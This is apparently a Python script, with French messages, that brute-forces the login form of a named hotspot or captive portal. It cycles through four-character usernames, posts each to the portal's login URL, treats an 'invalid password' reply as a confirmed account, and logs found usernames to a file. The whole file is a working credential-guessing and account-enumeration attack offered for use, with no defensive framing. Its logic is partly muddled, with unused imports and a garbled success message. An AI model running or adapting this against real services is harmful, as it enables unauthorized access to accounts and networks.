import requests
import time
import threading
import getpass
last=0
def crack():
    
    letra=['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','v','w','u','x','y','z','0','1','2','3','4','5','6','7','8','9','']
    lettre=[]
    longa=26
    long=longa
    bou=1
        
    repo5=4
    lettre=letra
    num=4
    long2=0
    long3=0
    rec=1
    x,y,z,u=0,0,0,last
    if rec==1:
        long2=0
        long3=2
    elif 2<=rec<=26:
        long2=rec
        long3=rec+2
    x=long2
    while 1:
        bou=1
        t1=time.time()
        user=(lettre[x]+lettre[y]+lettre[z]+lettre[u])
        paz=lettre[x]
        payload = dict(username=user, password=paz)  
        x+=1
        if x==long3:
                x=long2
                y+=1
                if num==1:
                        break
                else:
                        pass
        elif y==long:
                x=long2
                y=0
                z+=1
                if num==2:
                        break
                else:
                        pass
        elif z==long:
                x=long2
                y=0
                z=0
                u+=1
                if num==3:
                        break
                else :
                        pass
        elif u==long:
                if num==4:
                        break
        while bou:
            try:
                r = requests.post('http://fozane.net/login?dst=http%3A%2F%2Fwww.msftconnecttest.com%2Fredirect', data=payload)
                bou=0
            except :
                print("connexion perdu, reconnexion...",end="\r")
        t2=time.time()
        t4=int((t2-t1)*(36**4))
        t3=int((1/(t2-t1))*19)
        
        if "invalid password" in r.text:
            print("login et password trouver : {},{}".format(user,user))
            fd=open("login_found.txt",'a')
            fd.write("login : "+user)
            fd.close()
        else :
            print("login {} incorrect ||  {}  login/sec || {} sec restant ".format(user,t3,t4),end="\r")
